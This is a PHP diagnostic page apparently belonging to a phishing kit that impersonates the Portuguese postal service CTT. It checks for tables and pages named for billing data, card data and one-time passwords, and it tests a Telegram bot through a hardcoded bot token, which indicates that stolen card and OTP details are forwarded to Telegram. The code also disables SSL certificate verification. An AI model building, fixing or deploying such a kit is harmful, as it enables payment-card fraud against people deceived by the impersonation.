<?php
// System diagnostic test for CTT Expresso application
header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CTT Expresso - System Test</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .success { color: #28a745; font-weight: bold; }
        .error { color: #dc3545; font-weight: bold; }
        .warning { color: #ffc107; font-weight: bold; }
        .info { color: #17a2b8; font-weight: bold; }
        .test-section { margin: 20px 0; padding: 15px; border-left: 4px solid #007bff; background: #f8f9fa; }
        .test-item { margin: 10px 0; padding: 10px; background: white; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🧪 CTT Expresso System Diagnostic Test</h1>
        <p>This tool will verify all components of your CTT application are working correctly.</p>
        
        <div class="test-section">
            <h2>📋 System Information</h2>
            <div class="test-item">
                <strong>PHP Version:</strong> <?php echo phpversion(); ?><br>
                <strong>Server:</strong> <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?><br>
                <strong>Test Time:</strong> <?php echo date('Y-m-d H:i:s'); ?>
            </div>
        </div>

        <div class="test-section">
            <h2>🔧 PHP Extensions</h2>
            <div class="test-item">
                <strong>cURL:</strong> 
                <?php if (extension_loaded('curl')) { ?>
                    <span class="success">✅ ENABLED</span>
                <?php } else { ?>
                    <span class="error">❌ MISSING - Required for Telegram integration</span>
                <?php } ?><br>
                
                <strong>PDO:</strong> 
                <?php if (extension_loaded('pdo')) { ?>
                    <span class="success">✅ ENABLED</span>
                <?php } else { ?>
                    <span class="error">❌ MISSING - Required for database</span>
                <?php } ?><br>
                
                <strong>PDO MySQL:</strong> 
                <?php if (extension_loaded('pdo_mysql')) { ?>
                    <span class="success">✅ ENABLED</span>
                <?php } else { ?>
                    <span class="error">❌ MISSING - Required for MySQL database</span>
                <?php } ?><br>
                
                <strong>JSON:</strong> 
                <?php if (extension_loaded('json')) { ?>
                    <span class="success">✅ ENABLED</span>
                <?php } else { ?>
                    <span class="error">❌ MISSING - Required for API communication</span>
                <?php } ?>
            </div>
        </div>

        <div class="test-section">
            <h2>🗄️ Database Connection</h2>
            <div class="test-item">
                <?php
                try {
                    require_once 'config/database.php';
                    $db = new Database();
                    echo '<span class="success">✅ Database connection: SUCCESS</span><br>';
                    
                    // Test tables exist
                    $tables = ['billing_data', 'card_data', 'otp_data', 'config'];
                    foreach ($tables as $table) {
                        $result = $db->query("SHOW TABLES LIKE '$table'");
                        if ($result && $result->rowCount() > 0) {
                            echo "<span class=\"success\">✅ Table '$table': EXISTS</span><br>";
                        } else {
                            echo "<span class=\"error\">❌ Table '$table': MISSING</span><br>";
                        }
                    }
                    
                } catch (Exception $e) {
                    echo '<span class="error">❌ Database connection: FAILED</span><br>';
                    echo '<span class="error">Error: ' . htmlspecialchars($e->getMessage()) . '</span><br>';
                    echo '<span class="info">💡 Make sure MySQL is running and database is imported</span>';
                }
                ?>
            </div>
        </div>

        <div class="test-section">
            <h2>📱 Telegram Configuration</h2>
            <div class="test-item">
                <?php
                try {
                    require_once 'config/database.php';
                    $db = new Database();
                    
                    $tokenConfig = $db->fetchOne("SELECT config_value FROM config WHERE config_key = 'TELEGRAM_BOT_TOKEN'");
                    $chatConfig = $db->fetchOne("SELECT config_value FROM config WHERE config_key = 'TELEGRAM_CHAT_ID'");
                    
                    if ($tokenConfig && $chatConfig) {
                        echo '<span class="success">✅ Telegram configuration: FOUND</span><br>';
                        echo '<span class="info">Bot Token: ' . substr($tokenConfig['config_value'], 0, 10) . '...</span><br>';
                        echo '<span class="info">Chat ID: ' . $chatConfig['config_value'] . '</span><br>';
                    } else {
                        echo '<span class="error">❌ Telegram configuration: MISSING</span><br>';
                        echo '<span class="info">💡 Make sure config table has Telegram tokens</span>';
                    }
                    
                } catch (Exception $e) {
                    echo '<span class="error">❌ Telegram config check: FAILED</span><br>';
                    echo '<span class="error">Error: ' . htmlspecialchars($e->getMessage()) . '</span>';
                }
                ?>
            </div>
        </div>

        <div class="test-section">
            <h2>🌐 Telegram API Test</h2>
            <div class="test-item">
                <?php
                if (extension_loaded('curl')) {
                    $testUrl = "https://api.telegram.org/bot8482443491:AAE2BLcm95hkizPLXXDVUXenHjamWd2qdws/getMe";
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $testUrl);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                    $response = curl_exec($ch);
                    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    $curlError = curl_error($ch);
                    curl_close($ch);
                    
                    if ($curlError) {
                        echo '<span class="error">❌ Telegram API: cURL ERROR</span><br>';
                        echo '<span class="error">Error: ' . htmlspecialchars($curlError) . '</span>';
                    } elseif ($httpCode === 200) {
                        echo '<span class="success">✅ Telegram API: REACHABLE</span><br>';
                        $data = json_decode($response, true);
                        if ($data && isset($data['ok']) && $data['ok']) {
                            echo '<span class="success">✅ Bot Token: VALID</span><br>';
                            if (isset($data['result']['username'])) {
                                echo '<span class="info">Bot Username: @' . $data['result']['username'] . '</span>';
                            }
                        } else {
                            echo '<span class="error">❌ Bot Token: INVALID</span>';
                        }
                    } else {
                        echo '<span class="error">❌ Telegram API: HTTP ' . $httpCode . '</span><br>';
                        echo '<span class="error">Response: ' . htmlspecialchars(substr($response, 0, 200)) . '</span>';
                    }
                } else {
                    echo '<span class="error">❌ Cannot test - cURL not available</span>';
                }
                ?>
            </div>
        </div>

        <div class="test-section">
            <h2>📁 File Permissions</h2>
            <div class="test-item">
                <?php
                $files = [
                    'config/database.php',
                    'config/telegram.php',
                    'api/billing.php',
                    'api/card-submit.php',
                    'api/otp-verify.php',
                    'billing.php',
                    'card.php',
                    'otp.php',
                    'confirmation.php'
                ];
                
                foreach ($files as $file) {
                    if (file_exists($file)) {
                        if (is_readable($file)) {
                            echo "<span class=\"success\">✅ $file: READABLE</span><br>";
                        } else {
                            echo "<span class=\"error\">❌ $file: NOT READABLE</span><br>";
                        }
                    } else {
                        echo "<span class=\"error\">❌ $file: MISSING</span><br>";
                    }
                }
                ?>
            </div>
        </div>

        <div class="test-section">
            <h2>🧪 Quick Function Test</h2>
            <div class="test-item">
                <p><strong>Test sending a message to Telegram:</strong></p>
                <button onclick="testTelegram()" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">
                    🚀 Send Test Message
                </button>
                <div id="telegramResult" style="margin-top: 10px;"></div>
            </div>
        </div>

        <div class="test-section">
            <h2>📋 Summary</h2>
            <div class="test-item">
                <p><strong>If all tests show ✅ SUCCESS, your CTT Expresso application is ready to use!</strong></p>
                <p><strong>If you see ❌ ERRORS:</strong></p>
                <ul>
                    <li><strong>Database errors:</strong> Make sure XAMPP/MAMP MySQL is running and database.sql is imported</li>
                    <li><strong>cURL errors:</strong> Enable curl extension in php.ini</li>
                    <li><strong>Telegram errors:</strong> Check bot token and chat ID in database</li>
                    <li><strong>File errors:</strong> Check file permissions and paths</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
    async function testTelegram() {
        const resultDiv = document.getElementById('telegramResult');
        resultDiv.innerHTML = '<span style="color: #ffc107;">⏳ Sending test message...</span>';
        
        try {
            const response = await fetch('test-telegram.php');
            const text = await response.text();
            
            if (response.ok) {
                resultDiv.innerHTML = '<span style="color: #28a745;">✅ Test completed! Check result above.</span>';
                // Reload the page to show updated results
                setTimeout(() => {
                    window.location.reload();
                }, 2000);
            } else {
                resultDiv.innerHTML = '<span style="color: #dc3545;">❌ Test failed</span>';
            }
        } catch (error) {
            resultDiv.innerHTML = '<span style="color: #dc3545;">❌ Error: ' + error.message + '</span>';
        }
    }
    </script>
</body>
</html>